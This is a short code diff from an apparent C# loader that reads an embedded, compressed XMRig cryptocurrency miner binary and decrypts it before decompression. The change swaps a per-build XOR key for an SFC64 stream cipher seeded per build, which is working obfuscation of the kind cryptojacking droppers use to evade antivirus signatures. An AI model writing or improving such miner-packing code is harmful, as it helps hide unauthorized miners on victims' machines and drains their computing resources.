@@ -316,12 +316,21 @@ internal class Program
         if (s == null) return null;
         var buf = new byte[s.Length];
         s.ReadExactly(buf);
-        // XOR-decrypt with per-build key
-        if (!string.IsNullOrEmpty(MinerConfig.XorKey))
+        // SFC64 stream-cipher decrypt with per-build seed
+        if (!string.IsNullOrEmpty(MinerConfig.SfcSeed))
         {
-            var key = Convert.FromBase64String(MinerConfig.XorKey);
+            var seed = Convert.FromBase64String(MinerConfig.SfcSeed);
+            ulong a = BitConverter.ToUInt64(seed, 0),  b = BitConverter.ToUInt64(seed, 8),
+                  c = BitConverter.ToUInt64(seed, 16), d = BitConverter.ToUInt64(seed, 24);
             for (int i = 0; i < buf.Length; i++)
-                buf[i] ^= key[i % key.Length];
+            {
+                ulong k = a + b + d; d++;
+                a = b ^ (b >> 11);
+                b = c + (c << 3);
+                c = (c << 24) | (c >> 40);
+                c += k;
+                buf[i] ^= (byte)k;
+            }
         }
         // Deflate-decompress (xmrig.bin is stored compressed to reduce exe size)
         using var ms  = new System.IO.MemoryStream(buf);
